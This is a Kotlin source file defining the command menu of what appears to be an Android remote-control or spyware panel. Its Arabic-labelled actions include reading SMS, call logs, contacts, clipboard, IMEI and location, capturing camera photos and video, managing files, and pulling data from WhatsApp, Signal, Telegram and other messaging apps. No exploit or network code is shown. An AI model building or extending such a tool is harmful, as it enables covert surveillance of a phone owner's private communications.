package com.abuzahra.control.data.repository

import com.abuzahra.control.data.model.ActionItem

class CommandRepository {

    fun getDeviceInfoActions(): List<ActionItem> = listOf(
        ActionItem("\uD83D\uDCF1", "معلومات الجهاز", "get_info", category = "info"),
        ActionItem("\uD83D\uDD0B", "البطارية", "get_battery", category = "info"),
        ActionItem("\uD83D\uDCCD", "الموقع", "get_location", category = "info"),
        ActionItem("\uD83D\uDEA7", "معلومات WiFi", "get_wifi_info", category = "info"),
        ActionItem("\uD83D\uDC7E", "معلومات الشبكة", "get_network_info", category = "info"),
        ActionItem("\uD83D\uDDA5", "معلومات التخزين", "get_storage_info", category = "info"),
        ActionItem("\uD83D\uDCCE", "معلومات SIM", "get_sim_info", category = "info"),
        ActionItem("\uD83D\uDCDA", "التطبيقات المثبتة", "get_installed_apps", category = "info"),
        ActionItem("\u26A1", "التطبيقات المشغلة", "get_running_apps", category = "info"),
        ActionItem("\uD83D\uDD34", "رقم IMEI", "get_imei", category = "info")
    )

    fun getCameraActions(): List<ActionItem> = listOf(
        ActionItem("\uD83D\uDCF8", "لقطة شاشة", "screenshot", category = "camera"),
        ActionItem("\uD83D\uDC68\u200D\uD83C\uDFA8", "الكاميرا الأمامية", "front_camera", category = "camera"),
        ActionItem("\uD83D\uDCF7", "الكاميرا الخلفية", "back_camera", category = "camera"),
        ActionItem("\uD83C\uDFA5", "تسجيل فيديو", "record_video", category = "camera")
    )

    fun getConnectivityActions(): List<ActionItem> = listOf(
        ActionItem("\uD83D\uDEA7", "تشغيل WiFi", "enable_wifi", category = "connectivity"),
        ActionItem("\uD83D\uDEAB", "إيقاف WiFi", "disable_wifi", category = "connectivity"),
        ActionItem("\uD83D\uDCDF", "تشغيل البلوتوث", "enable_bluetooth", category = "connectivity"),
        ActionItem("\u274C", "إيقاف البلوتوث", "disable_bluetooth", category = "connectivity"),
        ActionItem("\u2708", "وضع الطيران", "airplane_on", category = "connectivity"),
        ActionItem("\uD83D\uDE49", "إلغاء الطيران", "airplane_off", category = "connectivity"),
        ActionItem("\uD83D\uDCFB", "تشغيل البيانات", "enable_mobile_data", category = "connectivity"),
        ActionItem("\uD83D\uDEAB", "إيقاف البيانات", "disable_mobile_data", category = "connectivity"),
        ActionItem("\uD83D\uDD11", "تشغيل نقطة الاتصال", "enable_hotspot", category = "connectivity"),
        ActionItem("\uD83D\uDD12", "إيقاف نقطة الاتصال", "disable_hotspot", category = "connectivity")
    )

    fun getAlertActions(): List<ActionItem> = listOf(
        ActionItem("\uD83D\uDD14", "تشغيل الرنين", "ring", category = "alert"),
        ActionItem("\uD83D\uDD23", "اهتزاز", "vibrate", category = "alert"),
        ActionItem("\uD83D\uDD0A", "تشغيل صوت", "play_sound", category = "alert"),
        ActionItem("\uD83D\uDDE3", "نطق نص", "speak_text", category = "alert"),
        ActionItem("\uD83D\uDD14", "إشعار تجريبي", "show_notification", category = "alert"),
        ActionItem("\uD83D\uDD26", "تشغيل المصباح", "torch_on", category = "alert"),
        ActionItem("\uD83D\uDD25", "إيقاف المصباح", "torch_off", category = "alert")
    )

    fun getSystemActions(): List<ActionItem> = listOf(
        ActionItem("\uD83D\uDD12", "قفل الهاتف", "lock_phone", category = "system"),
        ActionItem("\uD83D\uDD04", "إعادة تشغيل", "reboot", category = "system"),
        ActionItem("\u23F9", "إيقاف التشغيل", "power_off", category = "system"),
        ActionItem("\uD83D\uDCC5", "التقويم", "get_calendar", category = "system"),
        ActionItem("\uD83D\uDCCB", "الحافظة", "get_clipboard", category = "system"),
        ActionItem("\uD83D\uDD0A", "رفع الصوت", "volume_up", category = "system"),
        ActionItem("\uD83D\uDD09", "خفض الصوت", "volume_down", category = "system"),
        ActionItem("\u2600", "رفع السطوع", "brightness_up", category = "system"),
        ActionItem("\uD83C\uDF19", "خفض السطوع", "brightness_down", category = "system"),
        ActionItem("\uD83D\uDCF8", "لقطة شاشة + حفظ", "screenshot_save", category = "system")
    )

    fun getSmsCallsActions(): List<ActionItem> = listOf(
        ActionItem("\u2709", "الرسائل القصيرة", "get_sms", category = "sms"),
        ActionItem("\uD83D\uDCDE", "سجل المكالمات", "get_calls", category = "sms"),
        ActionItem("\uD83D\uDC65", "جهات الاتصال", "get_contacts", category = "sms"),
        ActionItem("\uD83D\uDD14", "الإشعارات", "get_notifications", category = "sms"),
        ActionItem("\uD83D\uDCCB", "الحافظة", "get_clipboard", category = "sms"),
        ActionItem("\uD83D\uDD0D", "تفاصيل المكالمات", "get_call_logs_detail", category = "sms")
    )

    fun getFileActions(): List<ActionItem> = listOf(
        ActionItem("\uD83D\uDCC1", "تصفح الملفات", "list_files", category = "files"),
        ActionItem("\uD83D\uDBC5", "الصور والمعرض", "get_gallery", category = "files"),
        ActionItem("\uD83D\uDD0D", "بحث في الملفات", "search_files", category = "files"),
        ActionItem("\uD83D\uDDC3", "الملفات الأخيرة", "recent_files", category = "files"),
        ActionItem("\u2B07", "تحميل ملف", "download_file", category = "files"),
        ActionItem("\u2B06", "رفع ملف", "upload_file", category = "files"),
        ActionItem("\uD83D\uDDD1", "حذف ملف", "delete_file", category = "files")
    )

    fun getSocialAppActions(): List<ActionItem> = listOf(
        ActionItem("\uD83D\uDCAC", "واتساب", "get_whatsapp", category = "social"),
        ActionItem("\u2708", "تليجرام", "get_telegram", category = "social"),
        ActionItem("\uD83D\uDCF8", "إنستجرام", "get_instagram", category = "social"),
        ActionItem("\uD83D\uDCAC", "ماسنجر", "get_messenger", category = "social"),
        ActionItem("\uD83D\uDCAB", "سناب شات", "get_snapchat", category = "social"),
        ActionItem("\uD83C\uDFB5", "تيك توك", "get_tiktok", category = "social"),
        ActionItem("\uD83D\uDD4A", "تويتر / X", "get_twitter", category = "social"),
        ActionItem("\uD83D\uDCF2", "فايبر", "get_viber", category = "social"),
        ActionItem("\uD83D\uDD35", "سيجنال", "get_signal", category = "social"),
        ActionItem("\uD83D\uDCD8", "فيسبوك", "get_facebook", category = "social"),
        ActionItem("\uD83C\uDFAE", "ديسكورد", "get_discord", category = "social"),
        ActionItem("\uD83C\uDDF1", "لاين", "get_line", category = "social"),
        ActionItem("\uD83C\uDF10", "سكايب", "get_skype", category = "social"),
        ActionItem("\uD83D\uDCFA", "يوتيوب", "get_youtube", category = "social")
    )

    fun getAllControlActions(): List<ActionItem> = listOf(
        ActionItem("", "معلومات الجهاز", "", category = "section"),
        *getDeviceInfoActions().toTypedArray(),
        ActionItem("", "الكاميرا والصور", "", category = "section"),
        *getCameraActions().toTypedArray(),
        ActionItem("", "الاتصالات", "", category = "section"),
        *getConnectivityActions().toTypedArray(),
        ActionItem("", "التنبيهات", "", category = "section"),
        *getAlertActions().toTypedArray(),
        ActionItem("", "النظام", "", category = "section"),
        *getSystemActions().toTypedArray()
    )
}
